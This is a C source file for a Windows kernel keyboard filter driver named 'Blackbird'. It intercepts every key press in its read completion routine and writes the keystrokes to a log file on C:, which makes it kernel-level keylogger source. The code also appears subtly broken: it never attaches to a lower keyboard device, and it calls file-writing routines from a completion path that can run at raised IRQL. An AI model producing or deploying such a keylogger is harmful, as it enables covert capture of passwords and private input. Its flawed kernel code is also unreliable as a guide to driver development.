/*
 * Blackbird Kernel-Space Driver
 * Windows keyboard filter driver implementation
 */

#include <ntddk.h>
#include <kbdmou.h>
#include <ntddkbd.h>

// Driver name and device name
#define DEVICE_NAME L"\\Device\\BlackbirdDriver"
#define DOSDEVICE_NAME L"\\DosDevices\\BlackbirdDriver"
#define LOG_FILE_PATH L"\\??\\C:\\blackbird_kernel.log"
#define BUFFER_SIZE 4096

// Driver context structure
typedef struct _DEVICE_EXTENSION {
    PDEVICE_OBJECT LowerDeviceObject;
    UNICODE_STRING LogFilePath;
    HANDLE LogFileHandle;
    KSPIN_LOCK LogLock;
    WCHAR LogBuffer[BUFFER_SIZE];
    ULONG BufferIndex;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

// Function declarations
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
__drv_dispatchType(IRP_MJ_CREATE) DRIVER_DISPATCH DispatchCreate;
__drv_dispatchType(IRP_MJ_CLOSE) DRIVER_DISPATCH DispatchClose;
__drv_dispatchType(IRP_MJ_READ) DRIVER_DISPATCH DispatchRead;
IO_COMPLETION_ROUTINE ReadCompletionRoutine;

NTSTATUS WriteToLogFile(PDEVICE_EXTENSION DeviceExtension, PCWSTR Buffer, ULONG Length);
NTSTATUS FlushLogBuffer(PDEVICE_EXTENSION DeviceExtension);

// Scan code to character mapping (simplified US keyboard layout)
const WCHAR ScanCodeToChar[256] = {
    0, 0, L'1', L'2', L'3', L'4', L'5', L'6', L'7', L'8', L'9', L'0', L'-', L'=', 0, 0,
    L'q', L'w', L'e', L'r', L't', L'y', L'u', L'i', L'o', L'p', L'[', L']', L'\n', 0, L'a', L's',
    L'd', L'f', L'g', L'h', L'j', L'k', L'l', L';', L'\'', L'`', 0, L'\\', L'z', L'x', L'c', L'v',
    L'b', L'n', L'm', L',', L'.', L'/', 0, 0, 0, L' '
};

// Driver entry point
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS status;
    UNICODE_STRING deviceName;
    UNICODE_STRING dosDeviceName;
    PDEVICE_OBJECT deviceObject = NULL;
    PDEVICE_EXTENSION deviceExtension = NULL;

    UNREFERENCED_PARAMETER(RegistryPath);

    KdPrint(("Blackbird: DriverEntry called\n"));

    // Initialize device name
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);

    // Create device object
    status = IoCreateDevice(
        DriverObject,
        sizeof(DEVICE_EXTENSION),
        &deviceName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Blackbird: Failed to create device: 0x%X\n", status));
        return status;
    }

    // Create symbolic link
    status = IoCreateSymbolicLink(&dosDeviceName, &deviceName);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Blackbird: Failed to create symbolic link: 0x%X\n", status));
        IoDeleteDevice(deviceObject);
        return status;
    }

    // Initialize device extension
    deviceExtension = (PDEVICE_EXTENSION)deviceObject->DeviceExtension;
    RtlZeroMemory(deviceExtension, sizeof(DEVICE_EXTENSION));
    KeInitializeSpinLock(&deviceExtension->LogLock);
    deviceExtension->BufferIndex = 0;
    RtlInitUnicodeString(&deviceExtension->LogFilePath, LOG_FILE_PATH);

    // Set dispatch routines
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
    DriverObject->DriverUnload = DriverUnload;

    // Open log file
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    
    InitializeObjectAttributes(
        &objectAttributes,
        &deviceExtension->LogFilePath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        NULL,
        NULL
    );

    status = ZwCreateFile(
        &deviceExtension->LogFileHandle,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Blackbird: Failed to create log file: 0x%X\n", status));
        deviceExtension->LogFileHandle = NULL;
    }

    KdPrint(("Blackbird: Driver loaded successfully\n"));
    return STATUS_SUCCESS;
}

// Driver unload routine
VOID DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNICODE_STRING dosDeviceName;
    PDEVICE_EXTENSION deviceExtension;

    KdPrint(("Blackbird: DriverUnload called\n"));

    // Flush remaining log data
    if (DriverObject->DeviceObject) {
        deviceExtension = (PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension;
        
        if (deviceExtension) {
            FlushLogBuffer(deviceExtension);
            
            // Close log file
            if (deviceExtension->LogFileHandle) {
                ZwClose(deviceExtension->LogFileHandle);
            }
        }
    }

    // Delete symbolic link
    RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
    IoDeleteSymbolicLink(&dosDeviceName);

    // Delete device
    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }

    KdPrint(("Blackbird: Driver unloaded\n"));
}

// Create dispatch routine
NTSTATUS DispatchCreate(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    KdPrint(("Blackbird: DispatchCreate called\n"));

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// Close dispatch routine
NTSTATUS DispatchClose(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PDEVICE_EXTENSION deviceExtension;

    KdPrint(("Blackbird: DispatchClose called\n"));

    deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    FlushLogBuffer(deviceExtension);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// Read dispatch routine (keyboard filter)
NTSTATUS DispatchRead(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PDEVICE_EXTENSION deviceExtension;
    PIO_STACK_LOCATION currentStack;

    deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    currentStack = IoGetCurrentIrpStackLocation(Irp);

    // Set completion routine to intercept keyboard input
    IoCopyCurrentIrpStackLocationToNext(Irp);
    IoSetCompletionRoutine(
        Irp,
        ReadCompletionRoutine,
        DeviceObject,
        TRUE,
        TRUE,
        TRUE
    );

    // Pass IRP down to lower device
    if (deviceExtension->LowerDeviceObject) {
        return IoCallDriver(deviceExtension->LowerDeviceObject, Irp);
    }

    return STATUS_SUCCESS;
}

// Read completion routine - intercepts keyboard data
NTSTATUS ReadCompletionRoutine(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp,
    _In_ PVOID Context
)
{
    PDEVICE_EXTENSION deviceExtension;
    PKEYBOARD_INPUT_DATA keyData;
    ULONG numKeys;
    ULONG i;
    WCHAR character;
    KIRQL oldIrql;

    UNREFERENCED_PARAMETER(Context);

    if (Irp->IoStatus.Status == STATUS_SUCCESS) {
        deviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
        keyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        numKeys = (ULONG)(Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));

        for (i = 0; i < numKeys; i++) {
            // Only log key presses, not releases
            if (keyData[i].Flags == KEY_MAKE || keyData[i].Flags == 0) {
                USHORT scanCode = keyData[i].MakeCode;
                
                // Convert scan code to character (simplified)
                if (scanCode < 256) {
                    character = ScanCodeToChar[scanCode];
                    
                    if (character != 0) {
                        // Add to buffer
                        KeAcquireSpinLock(&deviceExtension->LogLock, &oldIrql);
                        
                        if (deviceExtension->BufferIndex < BUFFER_SIZE - 1) {
                            deviceExtension->LogBuffer[deviceExtension->BufferIndex++] = character;
                        }
                        
                        // Flush if buffer is nearly full
                        if (deviceExtension->BufferIndex >= BUFFER_SIZE - 100) {
                            KeReleaseSpinLock(&deviceExtension->LogLock, oldIrql);
                            FlushLogBuffer(deviceExtension);
                        } else {
                            KeReleaseSpinLock(&deviceExtension->LogLock, oldIrql);
                        }

                        KdPrint(("Blackbird: Key pressed: %wc (scan: 0x%X)\n", character, scanCode));
                    }
                }
            }
        }
    }

    // If Irp->PendingReturned is set, we must call IoMarkIrpPending
    if (Irp->PendingReturned) {
        IoMarkIrpPending(Irp);
    }

    return Irp->IoStatus.Status;
}

// Write data to log file
NTSTATUS WriteToLogFile(
    _In_ PDEVICE_EXTENSION DeviceExtension,
    _In_ PCWSTR Buffer,
    _In_ ULONG Length
)
{
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatusBlock;

    if (!DeviceExtension->LogFileHandle) {
        return STATUS_INVALID_HANDLE;
    }

    status = ZwWriteFile(
        DeviceExtension->LogFileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        (PVOID)Buffer,
        Length * sizeof(WCHAR),
        NULL,
        NULL
    );

    return status;
}

// Flush log buffer to file
NTSTATUS FlushLogBuffer(
    _In_ PDEVICE_EXTENSION DeviceExtension
)
{
    NTSTATUS status = STATUS_SUCCESS;
    KIRQL oldIrql;
    WCHAR tempBuffer[BUFFER_SIZE];
    ULONG bufferSize;

    KeAcquireSpinLock(&DeviceExtension->LogLock, &oldIrql);
    
    if (DeviceExtension->BufferIndex > 0) {
        // Copy to temp buffer
        RtlCopyMemory(tempBuffer, DeviceExtension->LogBuffer, DeviceExtension->BufferIndex * sizeof(WCHAR));
        bufferSize = DeviceExtension->BufferIndex;
        
        // Clear the buffer
        DeviceExtension->BufferIndex = 0;
        
        KeReleaseSpinLock(&DeviceExtension->LogLock, oldIrql);
        
        // Write to file (outside spinlock)
        status = WriteToLogFile(DeviceExtension, tempBuffer, bufferSize);
        
        if (NT_SUCCESS(status)) {
            KdPrint(("Blackbird: Flushed %lu characters to log\n", bufferSize));
        } else {
            KdPrint(("Blackbird: Failed to flush log: 0x%X\n", status));
        }
    } else {
        KeReleaseSpinLock(&DeviceExtension->LogLock, oldIrql);
    }

    return status;
}
